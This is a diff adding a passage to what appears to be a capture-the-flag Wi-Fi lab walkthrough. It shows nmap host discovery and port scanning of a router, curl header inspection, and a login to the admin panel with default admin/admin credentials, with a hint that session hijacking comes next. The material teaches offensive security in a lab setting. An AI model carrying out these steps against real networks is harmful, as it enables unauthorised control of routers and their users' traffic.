@@ -604,6 +604,83 @@ bound to 192.168.2.23 -- renewal in 37222 seconds.
 
 The interface holds 192.168.2.23, and both the offer and the acknowledgement came from 192.168.2.1, which on a router of this class is the DHCP server, the gateway and the access point.  
 
+**Mapping the Subnet**  
 
+An address on the subnet places the attacker among the other hosts on it, and the first thing worth establishing is which addresses are occupied. nmap is the scanner for that. -sn confines it to host discovery, probing each address in the given range and reporting which ones reply without touching any ports, so a 256-address sweep finishes in seconds and returns an inventory rather than a service list.  
+
+```console
+user@debian-thm:~$ sudo nmap -sn 192.168.2.0/24
+Starting Nmap 7.93 ( https://nmap.org ) at 2026-07-04 15:22 CEST
+Nmap scan report for 192.168.2.1
+Host is up (0.00027s latency).
+MAC Address: F0:9F:C2:71:22:12 (Ubiquiti Networks)
+Nmap scan report for 192.168.2.7
+Host is up (0.00030s latency).
+MAC Address: 28:6C:07:6F:F9:43 (Xiaomi Electronics,co.)
+Nmap scan report for 192.168.2.8
+Host is up (0.00032s latency).
+MAC Address: 28:6C:07:6F:F9:44 (Xiaomi Electronics,co.)
+Nmap scan report for 192.168.2.23
+Host is up.
+Nmap done: 256 IP addresses (4 hosts up) scanned in 2.03 seconds
+```
+
+The four hosts that respond are the gateway at 192.168.2.1, the two stations from the capture at 192.168.2.7 and 192.168.2.8, whose MAC Address lines match the pair airodump-ng listed and which become relevant later, and the attacking interface at 192.168.2.23, which reports no MAC Address line because it is the host running the scan. Whether those clients can be reached directly depends on client isolation, which, when enabled, stops the access point forwarding frames between two associated stations. The gateway is never isolated, because every client must reach it in order to route.  
+
+The gateway is therefore the host to examine, and the second scan asks what it is running rather than whether it is there. -Pn instructs nmap to treat the target as up and scan it regardless of whether it answers the discovery probes, which stops a host that silently drops them from being written off as down before a single port is tried.  
+
+```console
+user@debian-thm:~$ sudo nmap -Pn 192.168.2.1
+Starting Nmap 7.93 ( https://nmap.org ) at 2026-07-04 15:22 CEST
+Nmap scan report for 192.168.2.1
+Host is up (0.00012s latency).
+Not shown: 996 closed tcp ports (reset)
+PORT     STATE SERVICE
+53/tcp   open  domain
+80/tcp   open  http
+443/tcp  open  https
+8080/tcp open  http-proxy
+MAC Address: F0:9F:C2:71:22:12 (Ubiquiti Networks)
+
+Nmap done: 1 IP address (1 host up) scanned in 1.86 seconds
+```
+
+HTTP listening on the gateway almost always indicates a management interface.  
+
+**The Admin Panel and Default Credentials**  
+
+curl requests the page from the command line, and the response headers alone are enough to show what the server intends. -D - dumps those headers, the lone - standing for standard output rather than a filename, and -o /dev/null discards the body so nothing but the headers reaches the screen. -s suppresses the progress meter.  
+
+```console
+user@debian-thm:~$ curl -s -D - http://192.168.2.1/ -o /dev/null
+HTTP/1.1 302 Found
+Date: Sat, 04 Jul 2026 15:22:04 GMT
+Server: Apache/2.4.66 (Debian)
+Set-Cookie: PHPSESSID=REDACTED; path=/
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate
+Pragma: no-cache
+location: login.php
+Content-Length: 0
+Content-Type: text/html; charset=UTF-8
+```
+
+The redirect to login.php indicates an application gating its content behind a session. The page is titled WiFi Router Configuration.  
+
+Vendor defaults are the first credentials worth trying against a device of this kind. A consumer router ships with a factory administrator account whose username and password are printed in the manual and published on the vendor's support site, and its panel is normally reachable only from the internal network, so the account is frequently left as it shipped on the reasoning that anyone already inside is trusted. Associating to the Wi-Fi has just made that reasoning false.  
+
+Submitting the factory admin/admin pair takes the same two requests used against the hidden network's panel in the reconnaissance room, a POST carrying the form fields and saving the cookie, then a second request presenting it:  
+
+```console
+user@debian-thm:~$ curl -s -c cookies.txt -d "Username=admin&Password=admin&Submit=Submit" http://192.168.2.1/login.php -o /dev/null
+user@debian-thm:~$ curl -s -b cookies.txt http://192.168.2.1/index.php
+    <title>WiFi Router Configuration</title>
+...
+Welcome admin<br><br>No FLAG, try logging in with another user ;)  <a href="logout.php">Click here</a> to Logout.
+```
+
+The defaults are accepted and the panel greets the session as admin. On a live router that account is the device, since the panel it unlocks sets the name servers handed to every client, the firewall and port-forwarding rules and the wireless configuration itself, which on most models displays the passphrase in cleartext. An unchanged factory password therefore converts access to the Wi-Fi into control of the network, which is why the pair is always tried first.  
+
+What it does not yield here is the flag, which is scoped to one of the router's real users rather than to the administrator. Their passwords are long random strings that no wordlist recovers, so the route to them is not a password at all but a session one of them has already opened.  
 
 
